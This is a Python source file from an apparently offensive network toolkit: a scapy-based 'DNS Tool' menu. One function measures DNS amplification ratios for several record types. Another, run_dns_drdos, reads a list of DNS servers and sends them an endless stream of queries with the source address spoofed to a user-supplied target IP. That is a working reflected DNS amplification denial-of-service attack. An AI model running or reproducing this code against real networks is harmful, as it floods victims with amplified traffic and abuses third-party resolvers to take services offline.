import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import os, sys, time, random, itertools
import scapy.all as scapy
from scapy.interfaces import NetworkInterface
from scapy.all import *
from scapy.all import UDP,DNS,DNSQR


from .utils import *
from .interface import NF_Interface


class NF_DNSTool:
    def __init__(self, interface: NetworkInterface):
        self.interface = interface

    #========================= MENUS =========================#

    def menu(self) -> None:
        def print_menu():
            selected = self.interface.description if self.interface else 'not selected'
            selected = str_fixed_len(selected, 52)
            info = ''
            if self.interface:
                network = NF_Interface.get_network_address_with_cidr(self.interface)
                gateway = NF_Interface.get_gateway_address(self.interface)
                info = '\n |   Network: {:18}      Gateway: {:15}       |'.format(
                    network if network else 'no network', gateway if gateway else 'no gateway'
                )
            print(f'''
 +-------------------------------------------------------------------+
 |                         < DNS Tool Menu >                         |
 +-------------------------------------------------------------------+
 |   Interface: {selected} |{info}
 +-------------------------------------------------------------------+
 |                                                                   |
 |   (1) Check DNS Amplification Rate                                |
 |                                                                   |
 |   (2) Run DNS-based DRDoS                                         |
 |                                                                   |
 |   (0) Back to Main Menu                                           |
 |                                                                   |
 +-------------------------------------------------------------------+\n''')

        print_menu()
        while True:
            try:
                i = input('[?] Enter menu number : ')
            except KeyboardInterrupt:
                print()
                break
            print()

            if i == '0':
                break
            elif i == '1':
                check_dns()
            elif i == '2':
                run_dns_drdos()
            else:
                continue

            try:
                input('[?] Press enter key to back to menu. ')
            except KeyboardInterrupt:
                print()
            print_menu()



def run_dns_drdos():
    f = open("dns_servers.txt", 'r')
    dns_servers = list(map(lambda x: x.strip(), f.readlines()))
    f.close()

    print(f'[+] DNS Server List Loaded! ({len(dns_servers)} servers)\n')
    # print(dns_servers)

    dns_query = input("[?] Enter DNS Query: ")
    dns_type = input("[?] Enter DNS Type: ")
    print()
    target_ip = input("[?] Enter Target IP: ")
    print()

    try:
        while True:
            for server in dns_servers:
                dns_payload = UDP(sport=RandShort(), dport=53) / DNS(rd=1,qd=DNSQR(qname=dns_query, qtype=dns_type))
                ip_payload = IP(src=target_ip, dst=server) / dns_payload
                send(ip_payload, verbose=0)
            time.sleep(0.01)
            print('[*] Sending DNS packets...')
    except KeyboardInterrupt:
        pass

def calc_dns_amplification_rate(dns_query, type="A"):
    dns_server = "8.8.8.8"
    ans = None
    while not ans:
        dns_payload = scapy.UDP(sport=RandShort(), dport=53) / DNS(rd=1,qd=DNSQR(qname=dns_query, qtype=type))
        ip_payload = IP(dst=dns_server) / dns_payload
        ans = sr1(ip_payload, timeout=1, verbose=0)
        time.sleep(0.5)
    return (len(ans) + 14) / (len(ip_payload) + 14) # 14 for Ethernet Frame


def check_dns():
    try:
        while True:
            dns_query = input(">>> Enter DNS Query: ") or "ctldl.windowsupdate.com" # "www.google.com"
            print()
            print(f"Checking DNS records of {dns_query}")
            print()
            types = ["A", "AAAA", "CNAME", "MX", "TXT"]
            for t in types:
                amp = calc_dns_amplification_rate(dns_query, t)
                print(f"Amplification Rate for '{t}' \t: {amp:.2f}")
            print()
            print()
    except KeyboardInterrupt:
        pass

